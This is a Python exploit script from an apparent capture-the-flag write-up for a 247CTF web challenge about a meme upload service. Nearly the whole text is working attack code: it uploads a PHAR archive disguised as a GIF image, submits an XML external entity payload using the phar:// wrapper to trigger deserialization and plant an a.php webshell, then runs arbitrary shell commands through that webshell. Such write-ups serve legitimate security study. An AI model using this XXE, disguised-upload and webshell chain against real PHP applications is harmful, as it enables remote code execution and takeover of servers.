
<https://github.com/4n86rakam1/writeup/blob/31cab4bc62826b0e47a9e615a8730ddf33a05e10/247CTF/WEB/MEME_UPLOAD_SERVICE/index.md>

```python
import re
import subprocess
import sys
import requests

requests.packages.urllib3.disable_warnings()
s = requests.Session()
# s.proxies = {"https": "http://127.0.0.1:8080"}
s.verify = False

BASE_URL = "https://98eb94f7312e3dde.247ctf.com"

# payload:
# https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages
# https://swisskyrepo.github.io/PayloadsAllTheThings/XXE%20Injection/#basic-blind-xxe


XML_PAYLOAD = """\
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "phar://{path}"> %xxe;]>
<message>
  <to>a</to>
  <from>b</from>
  <image>c</image>
</message>
"""


def main():
    # upload phar and create a.php webshell
    if len(sys.argv) != 2:
        p = subprocess.run(["php", '-d', 'phar.readonly=0', "create_phar.php"], capture_output=True, check=True)
        phar = p.stdout
        assert len(phar) <= 185

        # upload phar
        r = s.post(
            BASE_URL,
            files={"image": ("test.gif", phar, "image/gif")},
        )
        m = re.findall(r"Image uploaded (.*?)!", r.text)
        assert m, "Failed to upload image"
        image_path = m[0]

        # upload xml
        r = s.post(BASE_URL, data={"message": XML_PAYLOAD.format(path=image_path)})
        assert "Message stored" in r.text, "Failed to upload XML"

    else:
        cmd = sys.argv[1]
        r = s.get(f"{BASE_URL}/a.php", params={"0": cmd})
        m = re.findall(r"Hey (.*)! Take", r.text, re.MULTILINE | re.DOTALL)
        assert m

        print(m[0])


if __name__ == "__main__":
    main()
```
